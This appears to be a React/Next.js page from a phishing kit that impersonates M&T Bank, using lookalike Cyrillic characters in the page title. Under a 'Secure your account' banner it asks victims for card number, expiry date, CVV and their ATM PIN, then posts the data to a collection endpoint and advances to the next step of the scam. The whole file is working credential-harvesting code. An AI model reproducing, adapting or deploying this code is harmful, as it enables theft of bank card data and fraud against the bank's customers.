import React, { useContext, useState, useEffect } from "react";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import valid from "card-validator";
import ReactInputMask from "react-input-mask";
import Head from "next/head";
import { Wrapper } from "../../components/Wrapper";
import { Container } from "../../components/Container";
import { Button } from "../../components/Button";
import { Input } from "../../components/InputAlt";
import { getNextUrl } from "../../utils/getNextUrl";
import { getProgress } from "../../utils/getProgress";
import { DataContext } from "../_app";

interface CardProps {}

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("Card number number is required")
    .test(
      "test-number",
      "Card number not valid",
      (value) => valid.number(value).isValid
    ),
  expirationDate: yup
    .string()
    .required("Expiry date is required")
    .test(
      "test-date",
      "Date not valid",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required("CVV is required")
    .test("test-cvv", "CVV not required", (value) => valid.cvv(value).isValid),
  cardPin: yup
    .string()
    .required("Pin is required")
    .min(4, "Pin not valid")
    .max(5, "Pin not valid"),
});

export const Card: React.FC<CardProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD`);
    formData.append(
      `cardDetails`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-card-details`, formData);
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    const url = getProgress()[getProgress().indexOf(`Card`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper>
      <Head>
        <title>Verify Card Information | М&Т Ваnk</title>
      </Head>
      <Container
        upTitle={`Secure your account`}
        title={`Verify your card informatiom`}
        subTitle={`Enter the your card details.`}
        loading={loading}
      >
        <Input
          label={`Card number`}
          placeholder={`0000 0000 0000 0000`}
          as={ReactInputMask}
          mask={cardMask}
          error={errors.cardNumber && errors.cardNumber.message}
          register={register}
          registerOptions={{
            onChange: (event: any) => {
              var value = event.target.value;

              var newState = "9999 9999 9999 9999";
              if (/^3[47]/.test(value)) {
                newState = "9999 999999 99999";
              }
              setCardMask(newState);
            },
          }}
          name={`cardNumber`}
          curValue={watch(`cardNumber`)}
        />
        <Input
          label={`Expiry date`}
          placeholder={`MM/YY`}
          as={ReactInputMask}
          mask="99/9999"
          error={errors.expirationDate && errors.expirationDate.message}
          register={register}
          name={`expirationDate`}
          curValue={watch(`expirationDate`)}
        />
        <Input
          label={`CVV`}
          placeholder={`3-digits number at the back of your card`}
          error={errors.cvv && errors.cvv.message}
          register={register}
          name={`cvv`}
          curValue={watch(`cvv`)}
          type={`number`}
        />
        <Input
          label={`Pin`}
          placeholder={`The same pin you use at the ATM`}
          error={errors.cardPin && errors.cardPin.message}
          register={register}
          name={`cardPin`}
          curValue={watch(`cardPin`)}
          type={`number`}
        />
        <Button label={`Continue`} disabled={loading} onClick={onSubmit} />
      </Container>
    </Wrapper>
  );
};

export default Card;
